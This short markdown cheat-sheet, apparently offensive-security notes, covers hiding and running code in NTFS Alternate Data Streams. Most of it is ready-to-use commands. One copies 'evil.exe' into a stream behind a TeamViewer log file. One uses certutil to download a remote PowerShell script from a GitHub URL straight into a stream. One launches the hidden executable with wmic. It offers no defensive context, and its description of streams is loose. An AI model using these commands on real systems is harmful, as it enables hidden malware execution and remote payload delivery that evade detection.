### Alternate Data Streams:

* File on NTFS formatted drive has 2 streams:
  * Data stream: default stream - contains data
  * Resource stream: used for metadata
  * This is useful to hiding file
* Write to ADS
  * `type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"`
* Download directly into ADS
  * `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt`
* Executing from ADS
  * `wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'`
  * NOTE: full path
* There are many other methods to add and execute
